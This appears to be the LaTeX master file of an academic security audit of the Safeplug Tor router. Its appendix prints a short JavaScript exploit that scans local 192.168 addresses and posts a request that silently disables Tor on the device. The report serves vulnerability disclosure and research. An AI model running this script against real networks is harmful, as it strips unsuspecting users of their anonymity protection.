### 2014-02-05 report/report.tex
Typos and removal of honor code.

\documentclass[12pt, letterpaper]{article}
\usepackage[hyphens]{url}
\usepackage{breakurl}
\usepackage[pdftex]{graphicx}
\usepackage[left=1in,top=1in,right=1in,bottom=1in,head=.5in,foot=.5in]{geometry}
\usepackage{setspace}

%\usepackage{caption}
\usepackage{subcaption}
%\usepackage[small,compact]{titlesec}
\usepackage{listings}
\usepackage{listings}
\usepackage{color}
\lstnewenvironment{fileName}{%
\lstset{%
        basicstyle=\ttfamily,
        breaklines,
    }%
}{%
}

\title{Security Audit of Safeplug}
\author{Annie Edmundson and Anna Kornfeld Simpson}

\begin{document}

\maketitle

\input{abstract}

\input{intro}
\input{design}
\input{usability}
%\input{results}
%\input{resultsSoftware}
\input{implementattacks}
\input{discussion}
\input{related}
\input{conclusion}

\section{Acknowledgements}
We would like to express our gratitude to Ed Felten for helping us procure the Safeplugs and to Josh Kroll for donating a lot of time and his computer to the routing effort.  We also thank whoever left the very nice set of screwdrivers on our desks!

\input{bibliography}

\newpage
\appendix
\section{\\Javascript for Website Attack} \label{App:AppendixA}
\definecolor{dkgreen}{rgb}{0,0.6,0}
\definecolor{gray}{rgb}{0.5,0.5,0.5}
\definecolor{mauve}{rgb}{0.58,0,0.82}

\lstset{frame=tb,
  language=Java,
  aboveskip=3mm,
  belowskip=3mm,
  showstringspaces=false,
  columns=flexible,
  basicstyle={\small\ttfamily},
  numbers=none,
  numberstyle=\tiny\color{gray},
  keywordstyle=\color{blue},
  commentstyle=\color{dkgreen},
  stringstyle=\color{mauve},
  breaklines=true,
  breakatwhitespace=true
  tabsize=3
}

\begin{lstlisting}
function go() { 
   var IP_SCANS = 255;
   var prefix = "http://192."
   var SECOND_START = 168;
   var SECOND_END = 168;
   var THIRD_START = 0;
   var THIRD_END = 1;

   for (var i = SECOND_START; i <= SECOND_END; i++) {
      for (var j = THIRD_START; j <= THIRD_END; j++) {
         for (var k = 0; k < IP_SCANS; k++) 
         {
            var tryip = prefix +  i + "." + j + "." + k;
            var req = new XMLHttpRequest();
            req.open("POST", tryip + "/svc/xspctrl/disableTor", true);
            req.timeout = 1000;
            req.send();
         }
      }
   }
}
\end{lstlisting}

\end{document}